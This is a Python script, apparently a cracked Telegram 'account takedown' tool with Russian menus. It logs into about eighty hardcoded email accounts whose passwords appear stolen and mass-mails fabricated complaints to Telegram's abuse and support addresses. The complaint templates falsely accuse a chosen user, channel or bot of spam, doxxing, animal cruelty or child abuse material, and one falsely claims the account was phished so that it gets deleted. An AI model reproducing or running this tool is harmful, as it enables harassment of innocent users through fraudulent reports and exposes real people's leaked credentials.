#кряк сделал @pr0xit копипастеры съебались в страхе иначе вас ждет такая же участь ))

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import pyfiglet
from colorama import Fore, init
from termcolor import colored

init()

# Черный список аккаунтов (типа что бы его не снесли его же тулом)
blacklisted_accounts = {
    '6672775030': '@mar13nn'
}


senders = {
    'korlithiobtennick@mail.ru': 'feDLSiueGT89APb81v74',
    'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
    'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
    'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
    'aria.therese.svensson@mail.com': 'Zorro1ab',
    'taterbug@verizon.net': 'Holly1!',
    'ejbrickner@comcast.net': 'Pass1178',
    'teressapeart@cox.net': 'Quinton2329!',
    'liznees@verizon.net': 'Dancer008',
    'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
    'kcdg@charter.net': 'Jennifer3*',
    'bean_118@hotmail.com': 'Liverpool118!',
    'dsdhjas@mail.com': 'LONGHACH123',
    'robitwins@comcast.net': 'May241996',
    'wasina@live.com': 'Marlas21',
    'aruzhan.01@mail.com': '1234567!',
    'rob.tackett@live.com': 'metallic',
    'lindahallenbeck@verizon.net': 'Anakin@2014',
    'hlaw82@mail.com': 'Snoopy37$$',
    'paintmadman@comcast.net': 'mycat2200*',
    'prideandjoy@verizon.net': 'Ihatejen12',
    'sdgdfg56@mail.com': 'kenwood4201',
    'garrett.danelz@comcast.net': 'N11golfer!',
    'gillian_1211@hotmail.com': 'Gilloveu1211',
    'sunpit16@hotmail.com': 'Putter34!',
    'fdshelor@verizon.net': 'Masco123*',
    'yeags1@cox.net': 'Zoomom1965!',
    'amine002@usa.com': 'iScrRoXAei123',
    'bbarcelo16@cox.net': 'Bsb161089$$',
    'laliebert@hotmail.com': 'pirates2',
    'vallen285@comcast.net': 'Delft285!1!',
    'sierra12@email.com': 'tegen1111',
    'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
    'kmay@windstream.net': 'Nascar98',
    'redbrick1@mail.com': 'Redbrick11',
    'ivv9ah7f@mail.com': 'K226nw8duwg',
    'erkobir@live.com': 'floydLAWTON019',
    'Misscarter@mail.com': 'ashtray19',
    'carlieruby10@cox.net': 'Lollypop789$',
    'blackops2013@mail.com': 'amason123566',
    'caroline_cullum@comcast.net': 'carter14',
    'dpb13@live.com': 'Ic&ynum13',
    'heirhunter@usa.com': 'Noguys@714',
    'sherri.edwards@verizon.net': 'Dreaming123#',
    'rami.rami1980@hotmail.com': 'ramirami1980',
    'jmsingleton2@comcast.net': '151728Jn$$',
    'aberancho@aol.com': '10diegguuss10',
    'dgidel@iowatelecom.net': 'Buster48',
    'gpopandopul@mail.com': 'GEORG62A',
    'bolgodonsk@mail.com': '012345678!',
    'colbycolb@cox.net': 'Signals@1',
    'nicrey4@comcast.net': 'Dabears54',
    'mordechai@mail.com': 'Mordechai',
    'inemrzoya@mail.com': 'rLS1elaUrLS1elaU',
    'tarabedford@comcast.net': 'Money4me',
    'mycockneedsit@mail.com': 'benjamin3',
    'saralaine@mail.com': 'sarlaine12!1',
    'jonb2006@verizon.net': '1969Camaro',
    'rjhssa1@verizon.net': 'Donna613*',
    'cameron.doug@charter.net': 'Jake2122$',
    'bridget.shappell@comcast.net': 'Brennan1',
    'rugs8@comcast.net': 'baseball46',
    'averyjacobs3@mail.com': '1960682644!',
    'lstefanick@hotmail.com': 'Luv2dance2',
    'bchavez123@mail.com': 'aadrianachavez',
    'lukejamesjones@mail.com': 'tinkerbell1',
    'emahoney123@comcast.net': 'Shieknmme3#',
    'mandy10.mcevoy@btinternet.com': 'Tr1plets3',
    'jet747@cox.net': 'Sadie@1234',
    'landsgascareservices@mail.com': 'Alisha25@',
    'samantha224@mail.com': 'Madden098!@',
    'kbhamil@wowway.com': 'Carol1940',
    'email@bjasper.com': 'Lhsnh4us123!',
    'biggsbrian@cox.net': 'Trains@2247Trains@2247',
    'dzzeblnd@aol.com': 'Geosgal@1',
    'jtrego@indy.rr.com': 'Jackwill14!',
    'chrisphonte.rj@comcast.net': 'Junior@3311',
    'tvwifiguy@comcast.net': 'Bill#0101',
    'defenestrador@mail.com': 'm0rb1d8ss',
    'glangley@gmx.com': 'ironhide',
    'charlotte2850@hotmail.com': 'kelalu2850'
}
# Список получателей
receivers = [
    'sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
    'sticker@telegram.org', 'support@telegram.org'
]

def is_blacklisted(username, user_id):
    return user_id in blacklisted_accounts and blacklisted_accounts[user_id] == username



def logo():
    ascii_banner = pyfiglet.figlet_format("MARLEN  CRACK")
    return colored(ascii_banner, color='magenta')

def menu():
    print("CRACK BY @PR0XIT")
    print("1. Сносинг акков.")
    print("2. Снос канала")
    print("3. Cнос бота")
    print("4. Авторы проекта.")
    return input("ну выбирай: ")

def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        server = smtplib.SMTP('smtp.mail.ru', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        print(Fore.RED + f"Ошибка отправки: {e}")
        return False

def popi():
    import webbrowser
    import platform
    import os

    url10 = "https://t.me/pr0xit"
    if platform.system() == "Windows":
        webbrowser.open(url10)
    elif platform.system() == "Linux":
        if 'termux' in os.getenv('PREFIX', ''):
            os.system(f'termux-open-url {url10}')
        else:
            webbrowser.open(url10)
    else:
        webbrowser.open(url10)

def main():
    sent_emails = 0
    print(logo())
    choice = menu()

    if choice == '1':
        print("1. СНОСИНГ.")
        print("2. ДОКСУХ.")
        print("3. ТРОЛЛИНГ.")
        print("4. СНОС СЕССИЙ.")
        print("5. С премкой")
        print("6. С вирт номером.")
        comp_choice = input("выбирай: ")

        if comp_choice in ["1", "2", "3"]:
            username = input("юзер ( пример - @durov ): ")
            user_id = input("айди: ")
            chat_link = input("ссылку на чат: ")
            violation_link = input("ссылку на нарушение: ")

            if is_blacklisted(username, user_id):
                print(Fore.RED + f"Нельзя отправить жалобу на аккаунт {username} (ID: {user_id})")
                return

            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка. На вашей платформе я нашел пользователя который отправляет много ненужных сообщений - СПАМ. Его юзернейм - {username}, его айди - {user_id}, ссылка на чат - {chat_link}, ссылка на нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю.",
                "2": f"Здравствуйте, уважаемая поддержка, на вашей платформе я нашел пользователя, который распространяет чужие данные без их согласия. его юзернейм - {username}, его айди - {user_id}, ссылка на чат - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его аккаунта.",
                "3": f"Здравствуйте, уважаемая поддержка телеграм. Я нашел пользователя который открыто выражается нецензурной лексикой и спамит в чатах. его юзернейм - {username}, его айди - {user_id}, ссылка на чат - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его аккаунта."
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text
                    if send_email(receiver, sender_email, sender_password, 'Жалоба на аккаунт телеграм', comp_body):
                        print(f"Отправлено на {receiver} от {sender_email}!")
                        sent_emails += 14888
                        time.sleep(5)

        elif comp_choice == "4":
            username = input("юзернейм: ")
            user_id = input("айди: ")

            if is_blacklisted(username, user_id):
                print(Fore.RED + f"Нельзя отправить жалобу на аккаунт {username} (ID: {user_id})")
                return

            comp_texts = {
                "4": f"Здравствуйте, уважаемая поддержка. Я случайно перешел по фишинговой ссылке и утерял доступ к своему аккаунту. Его юзернейм - {username}, его айди - {user_id}. Пожалуйста удалите аккаунт или обнулите сессии"
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text
                    if send_email(receiver, sender_email, sender_password, 'Я утерял свой аккаунт в телеграм', comp_body):
                        print(f"Отправлено на {receiver} от {sender_email}!")
                        sent_emails += 14888
                        time.sleep(5)

        elif comp_choice in ["5", "6"]:
            username = input("юзернейм: ")
            user_id = input("айди: ")

            if is_blacklisted(username, user_id):
                print(Fore.RED + f"Нельзя отправить жалобу на аккаунт {username} (ID: {user_id})")
                return

            comp_texts = {
                "5": f"Добрый день поддержка Telegram! Аккаунт {username} , {user_id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться. Прошу разберитесь с этим. Заранее спасибо!",
                "6": f"Добрый день поддержка Telegram! Аккаунт {username} {user_id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram. Прошу проверить данную жалобу и принять меры!"
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text
                    if send_email(receiver, sender_email, sender_password, 'Жалоба на пользователя телеграм', comp_body):
                        print(f"Отправлено на {receiver} от {sender_email}!")
                        sent_emails += 9999
                        time.sleep(5)

    elif choice == "2":
        print("1. с личными данными")
        print("2. с живодерством")
        print("3. с цп")
        print("4. для каналов типа прайсов.")
        ch_choice = input("выбор: ")

        if ch_choice in ["1", "2", "3", "4"]:
            channel_link = input("ссылка на канал: ")
            channel_violation = input("ссылка на нарушение (в канале): ")

            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка телеграм. На вашей платформе я нашел канал, который распространяет личные данные невинных людей. Ссылка на канал - {channel_link}, ссылки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "2": f"Здравствуйте, уважаемая поддержка телеграма. На вашей платформе я нашел канал, который распространяет жестокое обращение с животными. Ссылка на канал - {channel_link}, ссылки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "3": f"Здравствуйте, уважаемая поддержка телеграма. На вашей платформе я нашел канал, который распространяет порнографию с участием несовершеннолетних. Ссылка на канал - {channel_link}, ссылки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "4": f"Здравствуйте, уважаемый модератор телеграм, хочу пожаловаться вам на канал, который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал: {channel_link} Ссылка на нарушение: {channel_violation}. Просьба заблокировать данный канал."
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[ch_choice]
                    comp_body = comp_text
                    if send_email(receiver, sender_email, sender_password, 'Жалоба на телеграм канал', comp_body):
                        print(f"Отправлено на {receiver} от {sender_email}!")
                        sent_emails += 100000
                        time.sleep(5)

    elif choice == "4":
        print("CraCked bY https://t.me/pr0xit")

    elif choice == "3":
        print("1. гэбэ")
        print("2. Пока не придумали")
        bot_ch = input("выбирай два стула, на одном пики точеные, на другом...: ")

        if bot_ch == "1":
            bot_user = input("юзер бота: ")

            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка телеграм. На вашей платформе я нашел бота, который осуществляет поиск по личным данным ваших пользователей. Ссылка на бота - {bot_user}. Пожалуйста разберитесь и заблокируйте данного бота."
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[bot_ch]
                    comp_body = comp_text
                    if send_email(receiver, sender_email, sender_password, 'Жалоба на бота телеграм', comp_body):
                        print(f"Отправлено на {receiver} от {sender_email}")
                        sent_emails += 1
                        time.sleep(5)

if __name__ == "__main__":
    popi()
    main()
